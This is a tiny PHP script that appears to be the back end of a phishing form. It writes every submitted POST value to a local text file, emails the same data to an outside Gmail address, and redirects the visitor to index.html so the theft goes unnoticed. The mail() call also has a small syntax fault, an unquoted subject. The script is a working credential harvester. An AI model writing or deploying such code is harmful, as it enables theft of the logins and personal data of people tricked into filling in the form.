<?php $file = 'Data.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);
$content=print_r($_POST,true);
mail("aman.a345@gmail.com",Hi ,"$content");
header("Location: index.html");

?>
